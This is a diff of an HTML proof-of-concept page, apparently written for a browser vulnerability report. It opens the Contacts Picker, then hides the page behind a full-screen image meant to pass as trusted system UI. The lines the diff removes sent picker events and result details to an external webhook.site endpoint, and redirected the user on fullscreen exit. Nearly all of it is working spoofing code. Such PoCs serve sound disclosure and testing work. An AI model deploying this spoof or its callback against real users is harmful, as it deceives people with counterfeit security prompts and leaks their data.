@@ -1,17 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>Contacts Picker Post-Permission UI PoC</title>
+  <title>Security UI Spoof (Post-Picker)</title>
   <meta charset="utf-8">
   <meta name="viewport"
         content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
 
   <style>
-    html, body {
+    body {
       margin: 0;
       padding: 0;
-      width: 100%;
-      height: 100%;
       background: #000;
       font-family: system-ui, sans-serif;
     }
@@ -19,20 +17,16 @@
     #spoof {
       position: fixed;
       inset: 0;
-      width: 100vw;
-      height: 100vh;
-      object-fit: cover;
+      width: 100%;
+      height: 100%;
       display: none;
-      z-index: 9999;
+      object-fit: cover;
     }
 
     #content {
-      height: 100%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #fff;
+      color: white;
       text-align: center;
+      margin-top: 40vh;
     }
   </style>
 </head>
@@ -42,93 +36,29 @@
 <img id="spoof" src="spof2.png" alt="spoof-ui">
 
 <div id="content">
-  <h1>Tap anywhere to open Contacts Picker</h1>
+  <h1>Click anywhere on the page</h1>
 </div>
 
 <script>
-/*
- * FINAL PoC
- * - Webhook fires ONLY during Contacts Picker lifecycle
- * - No fullscreen / visibility / redirect telemetry
- * - Contact data intentionally not collected
- */
-
-const WEBHOOK = "https://webhook.site/8c1d3f26-5912-43a1-b878-91e9d07b3274";
-
-function send(event, data = {}) {
-  fetch(WEBHOOK, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      time: new Date().toISOString(),
-      event,
-      ...data
-    })
-  }).catch(() => {});
-}
-
-document.addEventListener("click", async () => {
-
-  // ✅ REQUEST #1 — Contacts Picker invoked
-  send("contacts_picker_called", {
-    requested_fields: ["name", "tel", "email"]
-  });
-
-  let granted = false;
-
+onclick = async () => {
+  // 1️⃣ Trusted system UI (Contacts Picker)
   if (navigator.contacts && navigator.contacts.select) {
     try {
-      const result = await navigator.contacts.select(
-        ["name", "tel", "email"],
-        { multiple: false }
-      );
-
-      granted = result && result.length > 0;
-
-      // ✅ REQUEST #2 — Picker result
-      send("contacts_picker_result", {
-        granted,
-        payload_shape: granted ? {
-          hasName: !!result[0].name,
-          hasEmail: !!result[0].email,
-          hasTel: !!result[0].tel
-        } : null
-      });
-
+      await navigator.contacts.select(["name"], { multiple: false });
     } catch (e) {
-      send("contacts_picker_result", {
-        granted: false,
-        error: e.name
-      });
+      // user cancelled or error — still continue for demo
     }
-  } else {
-    send("contacts_picker_result", {
-      granted: false,
-      error: "Contacts API not supported"
-    });
   }
 
-  /* ---- NO MORE NETWORK REQUESTS BELOW ---- */
-
-  // Replace UI
+  // 2️⃣ Replace page UI
   document.getElementById("content").style.display = "none";
   document.getElementById("spoof").style.display = "block";
 
-  // Enter fullscreen using same user activation
+  // 3️⃣ Enter fullscreen (no race, modern behavior)
   if (document.documentElement.requestFullscreen) {
     document.documentElement.requestFullscreen().catch(() => {});
   }
-
-}, { once: true });
-
-// Silent fullscreen exit → redirect
-document.addEventListener("fullscreenchange", () => {
-  if (!document.fullscreenElement) {
-    setTimeout(() => {
-      location.href = "https://google.com";
-    }, 100);
-  }
-});
+};
 </script>
 
 </body>
